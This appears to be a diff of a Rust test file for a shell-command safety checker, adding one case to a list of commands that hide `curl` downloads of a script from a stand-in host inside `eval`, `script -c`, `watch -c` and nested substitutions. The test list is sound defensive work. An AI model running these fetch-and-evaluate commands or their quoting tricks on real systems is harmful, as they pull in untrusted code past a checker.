@@ -1514,6 +1514,7 @@ fn a_substitution_in_a_quote_is_text_unless_a_shell_is_given_it() {
         "script -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
         "watch -c 'x=$(curl -o f.sh https://x.example/f.sh)'",
         "true;eval 'x=$(curl -o f.sh https://x.example/f.sh)'",
+        "echo \"x $(eval 'x=$(curl -o f.sh https://x.example/f.sh)') y\"",
         "echo \"a\\\"b\"; eval 'x=$(curl -o f.sh https://x.example/f.sh)'",
         "echo 'a'\\''b'; eval 'x=$(curl -o f.sh https://x.example/f.sh)'",
         "echo it\\'s; eval 'x=$(curl -o f.sh https://x.example/f.sh)'",
